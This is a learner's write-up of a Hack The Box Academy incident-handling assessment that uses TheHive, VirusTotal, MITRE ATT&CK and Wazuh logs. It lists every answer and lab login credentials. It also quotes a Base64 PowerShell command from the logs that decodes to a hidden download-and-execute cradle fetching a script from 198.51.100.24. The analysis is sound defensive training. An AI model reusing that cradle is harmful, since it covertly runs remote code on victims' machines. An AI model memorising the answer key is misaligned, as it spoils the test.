# Hack The Box Academy - Incident Handling Process | Write-up

> **Platform:** Hack The Box Academy &nbsp;•&nbsp; **Category:** Incident Handling / SOC &nbsp;•&nbsp; **Type:** Skills Assessment
>
> **Author:** Jithin Jelson

---

## Introduction

This write-up documents the work I did in the Incident Handling Process skills assessment in HackTheBox Academy. This exercise required me to take on the role of a junior incident responder investigating a simulated breach referred to as Insights Nexus. The incident is built around TheHive, a case management platform used by SOC analysts to triage alerts, correlate evidence, and document findings, alongside supporting log data from Wazuh and open source threat intelligence lookups via VirusTotal.

The goal of this exercise was to practice a realistic end-to-end IR workflow:

- Creating a case in TheHive and linking related alerts together
- Triaging, enriching, and correlating evidence found in alert notes
- Validating indicators of compromise (IOCs) using external threat intelligence sources
- Mapping observed attacker behaviour to the Cyber Kill Chain and MITRE ATT&CK framework
- Analysing raw event logs to decode obfuscated commands and identify the responsible user account

- **TheHive accessed at:** `10.129.7.175:9000`
- **Credentials provided:** `htb-analyst / P3n#31337@LOG`


## Assessment Overview

```mermaid
flowchart LR
    A[Admin login via<br/>ManageEngine Web Console]

    A --> B1[203.0.113.18]
    A --> B2[198.51.100.24]

    B1 --> C1[VirusTotal:<br/>MangoJava.exe]
    B2 --> C2[Whois:<br/>Los Angeles]

    C1 --> D{MITRE ATT&CK<br/>Mapping}
    C2 --> D

    D --> E1[Ingress Tool<br/>Transfer<br/>T1105]
    D --> E2[Credential Access<br/>VaultCli.dll<br/>T1555]

    E1 --> F[Obfuscated PowerShell<br/>Base64 encoded]
    E2 --> F

    F --> G[Decoded payload<br/>downloads from<br/>198.51.100.24]

    G --> H[Responsible user<br/>CORP\svc-update]

    classDef entry fill:#1d4ed8,stroke:#1e3a8a,color:#ffffff;
    classDef ioc fill:#0f766e,stroke:#134e4a,color:#ffffff;
    classDef intel fill:#7c3aed,stroke:#5b21b6,color:#ffffff;
    classDef mitre fill:#b45309,stroke:#78350f,color:#ffffff;
    classDef payload fill:#be123c,stroke:#881337,color:#ffffff;
    classDef user fill:#15803d,stroke:#14532d,color:#ffffff;

    class A entry;
    class B1,B2 ioc;
    class C1,C2 intel;
    class D,E1,E2 mitre;
    class F,G payload;
    class H user;

    linkStyle default stroke-width:2px
```
---

## What I Learned

- How to run a full incident response workflow in TheHive, keeping alerts, evidence and findings tied to one case so nothing gets lost.
- Pivoting a suspicious IP and enrich it in VirusTotal, turning a single indicator into files, Whois data and a clearer picture of the attacker's activity.
- How to map observed behaviour to the MITRE ATT&CK framework and identify the correct technique IDs.
- Spotting and decoding a Base64 encoded PowerShell command to reveal the real payload and its callout IP.
- How to read raw event logs to trace an action back to the responsible user account (CORP\svc-update).
- That log analysis, threat intelligence and framework mapping all feed into the same investigation, and I'm more confident pulling them together now.
---

We can access TheHive with the IP address provided and enter the credentials given to us.

![TheHive login page](images/01-thehive-login.png)
*Figure 1 - TheHive login page*

---

## Alert enrichment: ManageEngine Admin Login

> Open the alert "[InsightNexus] Admin Login via ManageEngine Web Console." Find the foreign IP address starting with "203" in the comments. Check VirusTotal for the information related to this IP address, and add the details as a comment in this alert. In VirusTotal, what is the name of the file starting with "Mango" in the Files Referring section?

**Answer:** `MangoJava.exe`

First I navigated to the alert given to us.

![ManageEngine admin login alert](images/02-manageengine-alert.png)
*Figure 2 - The ManageEngine admin login alert*

We can now look for the foreign IP address the question provides that starts with 203. I have highlighted it down below.

![Foreign IP starting with 203](images/03-foreign-ip-203.png)
*Figure 3 - Foreign IP address starting with 203 in the comments*

Now this question asks us to put this IP address on VirusTotal and find the name of the file starting with "Mango" in the Files Referring section. We have the file MangoJava.exe.

![VirusTotal Files Referring showing MangoJava.exe](images/04-virustotal-mangojava.png)
*Figure 4 - MangoJava.exe in the VirusTotal Files Referring section*

Additionally we have also been asked to add the details as a comment. So we can do that by adding a new comment.

![Adding a comment to the alert](images/05-add-comment.png)
*Figure 5 - Adding the details as a new comment*

---

## VirusTotal Whois: IP starting with 198

> In VirusTotal, go to the details of the IP address starting with "198." What is the name of the city shown in the Whois Lookup?

**Answer:** `Los Angeles`

We can find the IP address that starts with 198 below.

![IP address starting with 198](images/06-ip-198.png)
*Figure 6 - IP address starting with 198*

We can put this on VirusTotal and find the Whois lookup for it. And we can see the address provided by the Whois lookup.

![Whois lookup showing Los Angeles](images/07-whois-los-angeles.png)
*Figure 7 - Whois lookup showing the city of Los Angeles*

---

## MITRE technique: C2 tool transfer

> If malware downloads files from a C2 (Command and Control) server into the victim network, under what MITRE technique ID does this tool transfer technique fall? Type it as your answer. The format is T1***.

**Answer:** `T1105`

For this question I navigated towards the MITRE ATT&CK framework and navigated to the Command and Control section to find the relevant MITRE technique. This transfer technique falls under Ingress Tool Transfer and we can get the ID by hovering over it.

![MITRE Ingress Tool Transfer T1105](images/08-mitre-ingress-tool-transfer.png)
*Figure 8 - Ingress Tool Transfer (T1105) in the MITRE ATT&CK framework*

---

## MITRE technique: Rule 92153 (VaultCli.dll)

> Open TheHive and check the rule ID 92153 related to the VaultCli.dll module. What is the MITRE technique ID for this activity? The format is T1***.

**Answer:** `T1555`

Now we've been tasked with finding the MITRE technique ID for a specific rule.

![TheHive rule 92153 for VaultCli.dll](images/09-rule-92153-vaultcli.png)
*Figure 9 - Rule ID 92153 related to the VaultCli.dll module*

We can then find the rule ID in the rule.mitre.id section.

![rule.mitre.id showing T1555](images/10-rule-mitre-id-t1555.png)
*Figure 10 - The MITRE technique ID T1555 in the rule.mitre.id section*

---

## Wazuh logs: decoding the PowerShell command

> Download the "logs-wazuh.zip" file from resources, and identify the suspicious PowerShell command in the logs. Type the suspicious IP address after decoding the command.
> **Answer:** `198.51.100.24`

When we analyse the file, there is only one clear suspicious PowerShell command in the logs, we can see this down below.

![Suspicious PowerShell command in the logs](images/11-suspicious-powershell.png)
*Figure 11 - The suspicious PowerShell command in the Wazuh logs*

From previous work we can identify that this is Base64, we can run a simple script to decode this.

```
SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzE5OC41MS4xMDAuMjQvZGVmZW5kZXIvZGVwbG95LWRlZmluaXRpb25zLnBzMScpOyBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwgLUFyZ3VtZW50TGlzdCAnLU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1GaWxlIEM6XFdpbmRvd3NcVGVtcFxkZXBsb3ktZGVmaW5pdGlvbnMucHMxJw
```

![Base64 command decoded showing the IP address](images/12-base64-decoded-ip.png)
*Figure 12 - The decoded command revealing the suspicious IP address*

And we can see the IP address.

---

## Wazuh logs: identifying the user

> In the same file (i.e., logs-wazuh.zip), identify the user who executed the suspicious PowerShell command. The format is domain\user.

**Answer:** `CORP\svc-update`

Underneath the Base64 command we can find the user that is responsible.

![User svc-update in the logs](images/13-user-svc-update.png)
*Figure 13 - The user account that executed the command*

We just now have to convert this into the format requested to us.
